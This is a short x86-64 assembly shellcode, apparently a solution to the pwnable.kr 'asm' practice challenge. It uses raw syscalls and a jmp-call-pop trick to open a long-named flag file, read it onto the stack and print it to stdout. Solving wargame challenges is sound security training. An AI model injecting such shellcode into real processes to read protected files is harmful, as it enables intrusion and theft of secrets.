section .text
        global _start

_start:
        jmp get_fileName


open_file:
        pop rdi
        mov al, 2
        xor rsi, rsi
        syscall

        mov rdi, rax
        xor rax, rax
        sub rsp, 4051  ; 0x1000 - len(stub)
        mov rsi, rsp
        mov rdx, 4051
        syscall

        mov rax, 1
        mov rdi, 1
        mov rsi, rsp
        mov rdx, 4051
        syscall


        xor rdi, rdi
        mov al, 60
        syscall





get_fileName:
        call open_file
        db 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong', 0

